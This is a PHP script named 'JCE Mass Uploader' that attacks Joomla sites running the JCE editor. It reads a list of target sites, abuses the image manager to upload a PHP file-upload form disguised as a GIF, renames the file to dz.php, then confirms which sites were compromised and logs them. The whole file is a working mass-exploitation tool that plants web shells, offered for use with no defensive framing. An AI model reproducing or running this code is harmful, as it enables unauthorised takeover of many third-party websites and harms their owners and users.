<?php
 
/*
 
JCE Mass Uploader
 
by yunusIncredibl
 
usage : php jce.php list.txt
 
all copyrights reserved to you
 
*/
 
set_time_limit (0);
 
//this is our uploader, you can change it, if you whant
$up = '<form enctype="multipart/form-data" method="POST"><input type="hidden" name="MAX_FILE_SIZE" value="512000" />File To Upload : <input name="userfile" type="file" /><input type="submit" value="Upload"/></form><?php $uploaddir = getcwd ()."/";$uploadfile = $uploaddir . basename ($_FILES[\'userfile\'][\'name\']);if (move_uploaded_file ($_FILES[\'userfile\'][\'tmp_name\'], $uploadfile)){echo "File was successfully uploaded.</br>";}else{echo "Upload failed";}?>';
 
//upload directory, you can change it if the directory is not writable
$dir = "/";
 
if (!isset ($argv[1]))
        die ("\nUsage : php {$argv[0]} list.txt\n");
 
if (!file_exists ($argv[1]))
        die ("\n\"{$argv[1]}\" File Not Found !\n");
 
$site = file ($argv[1]);
echo "\nNote : the result will be saved to the file \"result.txt\"\n";
echo "Loaded : ".count ($site)."\n\n";
 
$file = fopen ("result.txt", "a");
$name = "dz.php"; //you can change it with whatever you want :)
 
foreach ($site as $sites)
{
        $sites = trim ($sites);
        jce_upload ($sites, "by YunusIncredibl<br><br>".$up, $dir, $name); //upload as dz.gif & rename to .php
 
        // check if uploaded & renamed :)
        if (preg_match ("/YunusIncredibl/i", @file_get_contents ("$sites/images/stories/$name")))
        {
                echo "ok -> $sites/images/stories/$name\n";
                fwrite ($file, "$sites/images/stories/$name\n");
        }
        elseif (preg_match ("/YunusIncredibl/i", @file_get_contents ("$site/images/$name")))
        {
                echo "ok -> $site/images/$name\n";
                fwrite ($file, "$sites/images/$name\n");
        }
        elseif (preg_match ("/YunusIncredibl/i", @file_get_contents ("$site/$name")))
        {
                echo "ok -> $site/$name\n";
                fwrite ($file, "$sites/$name\n");
        }
        else
                echo "n0 -> $sites\n";
}
 
fclose ($file);
 
function jce_upload ($site, $content, $up_dir, $rename)
{
        $host = parse_url ($site, PHP_URL_HOST);
        $path = parse_url ($site, PHP_URL_PATH);
 
        if (!$path)
                $path = "/";
 
        $name = "dz.gif";
 
        $data    = "-----------------------------41184676334\r\n";
        $data   .= "Content-Disposition: form-data; name=\"upload-dir\"\r\n\r\n";
        $data   .= "$up_dir\r\n";
        $data   .= "-----------------------------41184676334\r\n";
        $data   .= "Content-Disposition: form-data; name=\"Filedata\"; filename=\"\"\r\n";
        $data   .= "Content-Type: application/octet-stream\r\n\r\n\r\n";
        $data   .= "-----------------------------41184676334\r\n";
        $data   .= "Content-Disposition: form-data; name=\"upload-overwrite\"\r\n\r\n";
        $data   .= "1\r\n";
        $data   .= "-----------------------------41184676334\r\n";
        $data   .= "Content-Disposition: form-data; name=\"Filedata\"; filename=\"$name\"\r\n";
        $data   .= "Content-Type: image/gif\r\n\r\n";
        $data   .= "$content\r\n";
        $data   .= "-----------------------------41184676334\r\n";
        $data   .= "0\r\n";
        $data   .= "-----------------------------41184676334\r\n";
        $data   .= "Content-Disposition: form-data; name=\"action\"\r\n\r\n";
        $data   .= "upload\r\n";
        $data   .= "-----------------------------41184676334--";
 
        $packet = "POST $path/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&action=upload HTTP/1.0\r\n";
        $packet .= "Host: $host\r\n";
        $packet .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:29.0) Gecko/20100101 Firefox/29.0\r\n";
        $packet .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*\/*;q=0.8\r\n";
        $packet .= "Accept-Language: en-us,en;q=0.5\r\n";
        $packet .= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
        $packet .= "Content-Type: multipart/form-data; boundary=---------------------------41184676334\r\n";
        $packet .= "Accept-Encoding: deflate\n";
        $packet .= "Connection: Close\r\n";
        $packet .= "Proxy-Connection: close\r\n";
        $packet .= "Content-Length: ".strlen ($data)."\r\n\r\n\r\n";
        $packet .= $data;
        $packet .= "\r\n";
 
        send ($host, $packet);
       
        //folderRename
        //fileRename
        //fileCopy
        $data = "json={\"fn\":\"folderRename\",\"args\":[\"$up_dir".$name."\",\"$rename\"]}";
       
        $packet  = "POST $path/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=156&format=raw HTTP/1.0\r\n";
        $packet .= "Host: $host\r\n";
        $packet .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:29.0) Gecko/20100101 Firefox/29.0\r\n";
        $packet .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
        $packet .= "Accept-Language: en-US,en;q=0.8\r\n";
        $packet .= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
        $packet .= "Content-Type: application/x-www-form-urlencoded; charset=utf-8\r\n";
        $packet .= "Accept-Encoding: deflate\n";
        $packet .= "X-Request: JSON\r\n";
        $packet .= "Content-Length: ".strlen ($data)."\r\n\r\n";
        $packet .= $data."\r\n\r\n";
       
        send ($host, $packet);
}
 
function send ($host, $packet)
{
        if ($connect = @fsockopen ($host, 80, $x, $y, 3))
        {
                @fputs ($connect, $packet);
                @fclose ($connect);
        }
}
 
?>